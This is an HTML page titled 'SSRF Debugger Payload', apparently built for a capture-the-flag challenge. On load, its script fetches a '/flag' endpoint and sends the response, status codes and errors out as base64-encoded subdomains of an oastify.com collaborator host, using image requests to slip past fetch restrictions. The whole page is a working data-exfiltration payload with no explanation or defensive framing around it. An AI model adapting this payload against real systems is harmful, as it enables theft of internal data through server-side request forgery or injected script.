<!DOCTYPE html>
<html>
<head>
    <title>SSRF Debugger Payload</title>
</head>
<body>
    <h1>Running advanced exfiltration...</h1>
    <script>
        // --- CONFIGURATION ---
        const targetUrl = "https://tar-award-writers-controllers.trycloudflare.com/flag";
        const collaboratorDomain = "9s21hth5hneqdenop30y7vrh086zuxim.oastify.com"; // <-- IMPORTANT: Change this!

        // --- ROBUST EXFILTRATION FUNCTION ---
        // This function creates an image element to make a request, which is often
        // less restricted than fetch(). We don't add it to the page, we just create it.
        function exfiltrate(data) {
            const encodedData = btoa(data).replace(/=/g, ''); // Base64, remove padding
            new Image().src = `https://${encodedData}.${collaboratorDomain}`;
        }

        // --- MAIN LOGIC ---
        async function runExploit() {
            // 1. Send a "start" signal so we know the script is running.
            exfiltrate("script-started");

            try {
                // 2. Attempt to fetch the flag.
                const response = await fetch(targetUrl);

                // 3. Send the HTTP status code of the response. This is a crucial debug step.
                // For example, if it's 404, we'll know the /flag endpoint is wrong.
                exfiltrate(`response-status-${response.status}`);

                if (!response.ok) {
                    throw new Error(`Non-200-status`);
                }
                
                const flagText = await response.text();

                if (flagText) {
                    // 4. If we got the flag, send it.
                    exfiltrate(`flag-${flagText.trim()}`);
                } else {
                    // 5. If the response was empty, tell us.
                    exfiltrate("flag-was-empty");
                }

            } catch (error) {
                // 6. If any part of the 'try' block failed, send the error message.
                exfiltrate(`error-${error.message}`);
            }
        }

        runExploit();
    </script>
</body>
</html>
